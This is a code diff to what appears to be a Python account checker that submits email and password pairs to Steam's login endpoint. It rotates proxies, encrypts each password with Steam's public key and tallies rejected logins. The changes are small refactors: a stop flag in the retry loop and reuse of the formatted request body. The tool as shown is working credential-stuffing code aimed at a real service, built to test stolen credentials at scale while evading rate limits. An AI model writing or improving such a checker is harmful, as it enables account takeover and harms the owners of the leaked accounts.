@@ -13,7 +13,7 @@ def check(email:str,password:str):
     username = email.split("@")[0] if "@" in email else email
     email = email if "@" in email else "-"
     
-    while 1:
+    while not Checker.stopping:
         try:
             proxy = set_proxy()
             proxy_set = set_proxy(proxy)
@@ -72,10 +72,12 @@ def check(email:str,password:str):
                 t_2 = keys["timestamp"]
                 
                 encrypted_password = quote(b64encode(encrypt(password.encode(),PublicKey(int(k1,16), int(k2,16)))))
-                length_2 = len(data_2.format(t_1,encrypted_password,username,t_2))
+
+                data_2 = data_2.format(t_1,encrypted_password,username,t_2)
+                length_2 = len(data_2)
                 header_2["Content-Length"] = str(length_2)
 
-                response = s.post("https://store.steampowered.com/login/dologin/",data=data_2.format(t_1,encrypted_password,username,t_2),headers=header_2)
+                response = s.post("https://store.steampowered.com/login/dologin/",data=data_2,headers=header_2)
                 if "\"The account name or password that you have entered is incorrect.\"," in response.text:
                     Checker.bad += 1
                     return_proxy(proxy)
